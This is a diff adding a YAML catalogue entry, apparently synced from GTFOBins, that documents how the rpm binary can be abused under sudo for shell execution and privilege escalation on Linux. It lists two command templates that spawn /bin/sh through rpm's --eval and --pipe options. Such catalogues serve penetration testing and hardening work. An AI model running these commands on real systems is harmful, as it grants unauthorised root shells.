@@ -1,0 +1,25 @@
+id: gtfobins/rpm/shell/sudo
+type: binary
+platform: linux
+name: rpm
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: rpm --eval '%(/bin/sh 1>&2)'
+- template: rpm --pipe '/bin/sh 0<&1'
+references:
+- https://gtfobins.github.io/gtfobins/rpm/
+tags:
+- linux
+- unix
+- gtfobins
